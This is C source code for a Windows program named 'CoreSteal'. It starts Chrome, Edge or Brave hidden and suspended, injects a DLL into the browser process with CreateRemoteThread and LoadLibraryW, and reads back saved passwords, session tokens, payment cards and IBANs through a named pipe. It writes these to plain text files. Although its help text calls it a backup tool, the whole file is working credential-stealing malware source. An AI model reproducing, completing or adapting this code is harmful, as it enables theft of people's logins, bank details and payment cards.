#include "Common.h"

typedef enum {
    Out_None,
    Out_Passwords,
    Out_Tokens,
    Out_Cards,
    Out_Ibans
} OutKind;

typedef enum {
    Browser_Chrome = 0,
    Browser_Edge,
    Browser_Brave
} BrowserKind;

BrowserKind g_browser = Browser_Chrome;

BOOL GetBrowserPath(LPCWSTR subKey, LPCWSTR valueName, LPWSTR outPath, DWORD outPathSize) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize = outPathSize * sizeof(WCHAR);
    WCHAR szPath[MAX_PATH] = {0};

    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExW(hKey, valueName, NULL, &dwType, (LPBYTE)szPath, &dwSize) == ERROR_SUCCESS) {
            wcscpy_s(outPath, outPathSize, szPath);
            RegCloseKey(hKey);
            return TRUE;
        }
        RegCloseKey(hKey);
    }

    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = outPathSize * sizeof(WCHAR);
        if (RegQueryValueExW(hKey, valueName, NULL, &dwType, (LPBYTE)szPath, &dwSize) == ERROR_SUCCESS) {
            wcscpy_s(outPath, outPathSize, szPath);
            RegCloseKey(hKey);
            return TRUE;
        }
        RegCloseKey(hKey);
    }

    return FALSE;
}

BOOL FileExists(LPCWSTR path) {
    return GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES;
}

BOOL FindBrowser(LPWSTR chromePath, DWORD chromePathSize) {
    WCHAR szPath[MAX_PATH] = {0};

    switch (g_browser) {
        case Browser_Chrome:
            if (GetBrowserPath(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", NULL, chromePath, chromePathSize)) {
                return TRUE;
            }
            ExpandEnvironmentStringsW(L"%ProgramFiles%\\Google\\Chrome\\Application\\chrome.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%ProgramFiles(x86)%\\Google\\Chrome\\Application\\chrome.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%LocalAppData%\\Google\\Chrome\\Application\\chrome.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            break;

        case Browser_Edge:
            if (GetBrowserPath(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\msedge.exe", NULL, chromePath, chromePathSize)) {
                return TRUE;
            }
            ExpandEnvironmentStringsW(L"%ProgramFiles%\\Microsoft\\Edge\\Application\\msedge.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%LocalAppData%\\Microsoft\\Edge\\Application\\msedge.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            break;

        case Browser_Brave:
            if (GetBrowserPath(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe", NULL, chromePath, chromePathSize)) {
                return TRUE;
            }
            ExpandEnvironmentStringsW(L"%ProgramFiles%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%ProgramFiles(x86)%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            ExpandEnvironmentStringsW(L"%LocalAppData%\\BraveSoftware\\Brave-Browser\\Application\\brave.exe", szPath, MAX_PATH);
            if (FileExists(szPath)) { wcscpy_s(chromePath, chromePathSize, szPath); return TRUE; }
            break;
    }

    return FALSE;
}

BOOL LaunchBrowser(STARTUPINFOW* si, PROCESS_INFORMATION* pi, LPWSTR browserPath, DWORD browserPathSize) {
    if (!FindBrowser(browserPath, browserPathSize)) {
        return FALSE;
    }

    ZeroMemory(si, sizeof(STARTUPINFOW));
    si->cb = sizeof(STARTUPINFOW);
    si->dwFlags = STARTF_USESHOWWINDOW;
    si->wShowWindow = SW_HIDE;
    ZeroMemory(pi, sizeof(PROCESS_INFORMATION));

    WCHAR cmdLine[MAX_PATH * 2] = {0};
    swprintf(cmdLine, L"\"%s\" --profile-directory=Default --no-startup-window", browserPath);

    if (!CreateProcessW(
        browserPath,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL,
        NULL,
        si,
        pi
    )) {
        return FALSE;
    }

    return TRUE;
}

BOOL InjectDll(DWORD pid, LPCWSTR dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return FALSE;

    SIZE_T pathSize = (wcslen(dllPath) + 1) * sizeof(WCHAR);
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathSize, NULL)) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    LPVOID loadLibAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryW");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return TRUE;
}

BOOL WriteLine(HANDLE hFile, LPCSTR line) {
    DWORD bytesWritten;
    return WriteFile(hFile, line, (DWORD)strlen(line), &bytesWritten, NULL);
}

void ReadPipe(HANDLE hPipe) {
    HANDLE hPassFile = CreateFileA("passwords.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hTokenFile = CreateFileA("tokens.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hCardFile = CreateFileA("cartoes.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    HANDLE hIbanFile = CreateFileA("ibans.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    OutKind currentKind = Out_None;
    char currentProfile[MAX_PATH] = {0};
    BOOL inBlock = FALSE;

    char buffer[4096];
    char accumulator[8192] = {0};
    DWORD accumulatorLen = 0;
    DWORD bytesRead;

    while (ReadFile(hPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        if (accumulatorLen + bytesRead < sizeof(accumulator)) {
            strcat(accumulator, buffer);
            accumulatorLen += bytesRead;
        }

        char* newlinePos;
        while ((newlinePos = strchr(accumulator, '\n')) != NULL) {
            *newlinePos = '\0';
            char line[4096];
            strcpy(line, accumulator);

            DWORD remainingLen = accumulatorLen - (newlinePos - accumulator) - 1;
            memmove(accumulator, newlinePos + 1, remainingLen);
            accumulator[remainingLen] = '\0';
            accumulatorLen = remainingLen;

            if (strncmp(line, "[PROFILE_START]", 15) == 0) {
                char* endPos = strstr(line, "[PROFILE_END]");
                if (endPos != NULL) {
                    strncpy(currentProfile, line + 15, endPos - (line + 15));
                    currentProfile[endPos - (line + 15)] = '\0';
                }
                continue;
            }

            if (strcmp(line, "[TYPE_PASSWORDS]") == 0) {
                currentKind = Out_Passwords;
                if (currentProfile[0] != '\0') {
                    char profileLine[MAX_PATH + 20];
                    sprintf(profileLine, "\n=== Perfil: %s ===\n", currentProfile);
                    WriteLine(hPassFile, profileLine);
                }
                continue;
            }

            if (strcmp(line, "[TYPE_TOKENS]") == 0) {
                currentKind = Out_Tokens;
                if (currentProfile[0] != '\0') {
                    char profileLine[MAX_PATH + 20];
                    sprintf(profileLine, "\n=== Perfil: %s ===\n", currentProfile);
                    WriteLine(hTokenFile, profileLine);
                }
                continue;
            }

            if (strcmp(line, "[TYPE_CARDS]") == 0) {
                currentKind = Out_Cards;
                if (currentProfile[0] != '\0') {
                    char profileLine[MAX_PATH + 20];
                    sprintf(profileLine, "\n=== Perfil: %s ===\n", currentProfile);
                    WriteLine(hCardFile, profileLine);
                }
                continue;
            }

            if (strcmp(line, "[TYPE_IBANS]") == 0) {
                currentKind = Out_Ibans;
                if (currentProfile[0] != '\0') {
                    char profileLine[MAX_PATH + 20];
                    sprintf(profileLine, "\n=== Perfil: %s ===\n", currentProfile);
                    WriteLine(hIbanFile, profileLine);
                }
                continue;
            }

            if (strcmp(line, "[PASSWORD_START]") == 0 || strcmp(line, "[TOKEN_START]") == 0 || 
                strcmp(line, "[CARD_START]") == 0 || strcmp(line, "[IBAN_START]") == 0) {
                inBlock = TRUE;
                continue;
            }

            if (strcmp(line, "[PASSWORD_END]") == 0 || strcmp(line, "[TOKEN_END]") == 0 || 
                strcmp(line, "[CARD_END]") == 0 || strcmp(line, "[IBAN_END]") == 0) {
                inBlock = FALSE;
                switch (currentKind) {
                    case Out_Passwords: WriteLine(hPassFile, "----------------------------------------\n"); break;
                    case Out_Tokens: WriteLine(hTokenFile, "----------------------------------------\n"); break;
                    case Out_Cards: WriteLine(hCardFile, "----------------------------------------\n"); break;
                    case Out_Ibans: WriteLine(hIbanFile, "----------------------------------------\n"); break;
                    default: break;
                }
                continue;
            }

            if (inBlock) {
                char lineWithNewline[4097];
                sprintf(lineWithNewline, "%s\n", line);
                switch (currentKind) {
                    case Out_Passwords:
                        WriteLine(hPassFile, lineWithNewline);
                        break;
                    case Out_Tokens:
                        WriteLine(hTokenFile, lineWithNewline);
                        break;
                    case Out_Cards:
                        WriteLine(hCardFile, lineWithNewline);
                        break;
                    case Out_Ibans:
                        WriteLine(hIbanFile, lineWithNewline);
                        break;
                    default:
                        break;
                }
            }
        }
    }

    CloseHandle(hPassFile);
    CloseHandle(hTokenFile);
    CloseHandle(hCardFile);
    CloseHandle(hIbanFile);
}

void ShowHelp(void) {
    MessageBoxA(NULL, 
        "Uso: CoreSteal.exe [opcoes]\n\n"
        "Opcoes:\n"
        "  --chrome    Usa Google Chrome (padrao)\n"
        "  --edge      Usa Microsoft Edge\n"
        "  --brave     Usa Brave Browser\n\n"
        "Exemplos:\n"
        "  CoreSteal.exe --chrome\n"
        "  CoreSteal.exe --edge\n"
        "  CoreSteal.exe --brave",
        "CoreSteal - Backup App-Bound Encryption", MB_OK | MB_ICONINFORMATION);
}

void ParseArgs(LPSTR lpCmdLine) {
    char cmdCopy[4096];
    strncpy(cmdCopy, lpCmdLine, sizeof(cmdCopy) - 1);
    cmdCopy[sizeof(cmdCopy) - 1] = '\0';

    char* token = strtok(cmdCopy, " \t");
    while (token != NULL) {
        if (strcmp(token, "--chrome") == 0 || strcmp(token, "-c") == 0) {
            g_browser = Browser_Chrome;
        } else if (strcmp(token, "--edge") == 0 || strcmp(token, "-e") == 0) {
            g_browser = Browser_Edge;
        } else if (strcmp(token, "--brave") == 0 || strcmp(token, "-b") == 0) {
            g_browser = Browser_Brave;
        } else if (strcmp(token, "--help") == 0 || strcmp(token, "-h") == 0 || strcmp(token, "/?") == 0) {
            ShowHelp();
            ExitProcess(0);
        }
        token = strtok(NULL, " \t");
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    FreeConsole();

    ParseArgs(lpCmdLine);

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    WCHAR browserPath[MAX_PATH] = {0};

    if (!LaunchBrowser(&si, &pi, browserPath, MAX_PATH)) {
        const char* browserName = "Chrome";
        if (g_browser == Browser_Edge) browserName = "Edge";
        else if (g_browser == Browser_Brave) browserName = "Brave";
        char msg[256];
        sprintf(msg, "Nao foi possivel encontrar o executavel do %s.", browserName);
        MessageBoxA(NULL, msg, "Erro", MB_OK | MB_ICONERROR);
        return 1;
    }

    WCHAR dllPath[MAX_PATH] = {0};
    GetModuleFileNameW(NULL, dllPath, MAX_PATH);
    WCHAR* lastSlash = wcsrchr(dllPath, L'\\');
    if (lastSlash == NULL) {
        lastSlash = wcsrchr(dllPath, L'/');
    }
    if (lastSlash != NULL) {
        wcscpy(lastSlash + 1, L"Extractor.dll");
    }

    HANDLE hPipe = CreateNamedPipeW(
        L"\\\\.\\pipe\\ChromePasswordPipe",
        PIPE_ACCESS_INBOUND,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1,
        4096,
        4096,
        0,
        NULL
    );

    if (hPipe == INVALID_HANDLE_VALUE) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }

    if (!InjectDll(pi.dwProcessId, dllPath)) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(hPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        MessageBoxA(NULL, "Falha ao injetar Extractor.dll no processo do navegador.", "Erro", MB_OK | MB_ICONERROR);
        return 1;
    }

    ResumeThread(pi.hThread);

    if (!ConnectNamedPipe(hPipe, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            TerminateProcess(pi.hProcess, 0);
            CloseHandle(hPipe);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return 1;
        }
    }

    ReadPipe(hPipe);

    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 2000);

    CloseHandle(hPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
